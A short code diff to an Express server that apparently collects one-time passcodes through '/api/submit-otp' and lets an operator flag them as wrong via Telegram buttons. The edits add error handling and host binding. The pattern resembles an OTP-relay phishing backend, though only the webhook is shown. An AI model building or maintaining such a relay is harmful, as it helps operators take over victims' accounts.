@@ -96,6 +96,7 @@ app.post('/api/submit-otp', async (req, res) => {
 // 4. Telegram Webhook to catch button clicks
 app.post('/webhook', async (req, res) => {
     const update = req.body;
+    
     if (update.callback_query) {
         const action = update.callback_query.data;
         
@@ -105,16 +106,19 @@ app.post('/webhook', async (req, res) => {
             latestStatus = "wrong_otp";
         }
         
+        // Acknowledge the callback query immediately to stop Telegram buttons from hanging on "Connecting..."
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ callback_query_id: update.callback_query.id, text: "Action recorded!" })
-        });
+            body: JSON.stringify({ callback_query_id: update.callback_query.id, text: "Action recorded successfully!" })
+        }).catch(err => console.error("Callback answer error:", err));
     }
+    
     res.sendStatus(200);
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
+// Binding to '0.0.0.0' is crucial for Render to allow external web traffic properly
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`Server running on port ${PORT}`);
 });
